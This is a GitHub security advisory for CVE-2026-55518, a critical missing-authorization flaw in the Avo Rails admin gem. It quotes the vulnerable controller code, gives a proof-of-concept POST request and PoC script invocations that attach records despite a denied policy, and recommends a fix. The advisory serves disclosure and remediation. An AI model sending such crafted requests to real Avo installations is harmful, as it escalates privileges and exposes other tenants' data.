# [C] Avo: Missing Authorization in Avo Association Attach Endpoint Allows Unauthorized Relationship Manipulation and Privilege Escalation

## Summary
Severity: Critical
Advisory: GHSA-8fq9-273g-6mrg
CVE: CVE-2026-55518
CWE: CWE-639, CWE-862, CWE-863
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-8fq9-273g-6mrg
Type: github-advisory

## Affected
- RubyGems: `avo` — affected >=0 <3.32.1
- RubyGems: `avo` — affected >=4.0.0.beta.1 <4.0.0.beta.51

## Details
## Summary

A critical missing authorization flaw exists in Avo's association attach workflow. The UI and `GET /resources/:resource/:id/:related/new` path can check `attach_<association>?`, but the actual write endpoint, `POST /resources/:resource/:id/:related`, does not run the same authorization check before mutating the association.

As a result, an authenticated low-privileged Avo user can bypass hidden/disabled attach controls and directly attach related records to a parent record by sending a crafted POST request. In applications where associations represent teams, tenants, roles, projects, users, memberships, ownership, or other authorization-bearing relationships, this can lead to privilege escalation and cross-tenant data exposure.

## Details

The association attach route writes relationships through `Avo::AssociationsController#create`:

```ruby
# config/routes.rb
post "/:resource_name/:id/:related_name", to: "associations#create", as: "associations_create"
```

The controller registers an attach authorization callback only for `new`, not for `create`:

```ruby
# app/controllers/avo/associations_controller.rb
before_action :set_attachment_record, only: [:create, :destroy]
before_action :authorize_index_action, only: :index
before_action :authorize_attach_action, only: :new
before_action :authorize_detach_action, only: :destroy
```

The `new` action is only the form-rendering step. The actual mutation happens in `create`:

```ruby
def create
  if create_association
    create_success_action
  else
    create_fail_action
  end
end
```

`create_association` then attaches the attacker-supplied related record to the parent:

```ruby
def create_association
  association_name = BaseResource.valid_association_name(@record, association_from_params)

  perform_action_and_record_errors do
    if through_reflection? && additional_params.present?
      new_join_record.save
    elsif has_many_reflection? || through_reflection?
      @record.send(association_name) << @attachment_record
    else
      @record.send(:"#{association_name}=", @attachment_record)
      @record.save!
    end
  end
end
```

The only attach-specific authorization helper is:

```ruby
def authorize_attach_action
  authorize_if_defined "attach_#{@field.id}?"
end
```

Because this helper is bound only to `new`, a policy that denies `attach_users?`, `attach_teams?`, `attach_roles?`, or similar methods blocks the UI/form path but does not protect the write path.

This is inconsistent with the detach path, which does authorize the mutating `destroy` action:

```ruby
before_action :authorize_detach_action, only: :destroy
```

The bug is especially dangerous because Avo already treats association authorization as an access-control boundary in UI components:

```ruby
# lib/avo/concerns/checks_assoc_authorization.rb
method_name = :"#{policy_method}_#{association_name}?".to_sym

if service.has_method?(method_name, raise_exception: false)
  service.authorize_action(method_name, record:, raise_exception: false)
else
  !Avo.configuration.explicit_authorization
end
```

However, server-side enforcement is missing on the actual attach POST endpoint.

## Proof of Concept

Prerequisites:

1. A Rails application mounts Avo, for example at `/admin`.
2. Avo authorization is enabled.
3. A low-privileged user can authenticate to Avo.
4. A parent record and a related record are both reachable by ID.
5. The relevant policy denies attaching the relationship, for example:

```ruby
def attach_users?
  false
end
```

Example target scenario:

- Parent resource: `projects`
- Parent ID: `1`
- Related association: `users`
- Related user ID to attach: `42`
- Expected policy: low-privileged users must not be able to attach users to projects.

The UI/form request may be blocked:

```http
GET /admin/resources/projects/1/users/new
```

But the direct write endpoint can still be invoked:

```http
POST /admin/resources/projects/1/users
Content-Type: application/x-www-form-urlencoded

authenticity_token=<CSRF>&fields[related_id]=42
```

Run the attached PoC:

```bash
python poc_avo_association_attach_bypass.py \
  --base-url http://localhost:3000 \
  --avo-root /admin \
  --cookie "_app_session=<LOW_PRIVILEGED_SESSION_COOKIE>" \
  --parent-resource projects \
  --parent-id 1 \
  --related-name users \
  --related-id 42 \
  --check-new
```

If `GET /new` is forbidden or redirected but the direct POST succeeds, the authorization bypass is confirmed.

To perform the actual attach:

```bash
python poc_avo_association_attach_bypass.py \
  --base-url http://localhost:3000 \
  --avo-root /admin \
  --cookie "_app_session=<LOW_PRIVILEGED_SESSION_COOKIE>" \
  --parent-resource projects \
  --parent-id 1 \
  --related-name users \
  --related-id 42 \
  --confirm-attach
```

Expected vulnerable result:

- The low-privileged user can attach the related record despite `attach_<association>?` being denied.
- The parent record now includes the related record.

## Impact

This vulnerability allows unauthorized relationship manipulation through Avo.

Depending on the affected association, the impact can include:

- Privilege escalation by attaching a user to an admin group, privileged project, tenant, organization, role, or membership record.
- Cross-tenant data exposure when tenant/user/project membership determines record visibility.
- Integrity loss by changing ownership, assignment, access-control relationships, or business workflow state.
- Policy bypass even when Avo UI controls correctly hide the attach button or deny the attach form.

## Recommended Fix

Enforce attach authorization on the mutating endpoint.

At minimum:

```ruby
before_action :authorize_attach_action, only: [:new, :create]
```

Additionally:

1. Authorize against the parent record and the selected related record before writing the relationship.
2. Ensure `create` fails closed when `attach_<association>?` is missing and `explicit_authorization` is enabled.
3. Add regression tests that directly POST to `/resources/:resource_name/:id/:related_name` while `attach_<association>?` returns `false`.
4. Verify `has_many`, `has_one`, `has_many :through`, and `has_and_belongs_to_many` association paths all enforce the same server-side authorization.

## References
- https://github.com/avo-hq/avo/security/advisories/GHSA-8fq9-273g-6mrg
- https://nvd.nist.gov/vuln/detail/CVE-2026-55518
- https://github.com/avo-hq/avo/pull/4568
- https://github.com/avo-hq/avo/commit/995928e586fd1788dd496bd51c4dbe4a79cb2b9c
- https://github.com/avo-hq/avo
- https://github.com/avo-hq/avo/releases/tag/v3.32.1
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/avo/CVE-2026-55518.yml
- https://www.cve.org/CVERecord?id=CVE-2026-55518
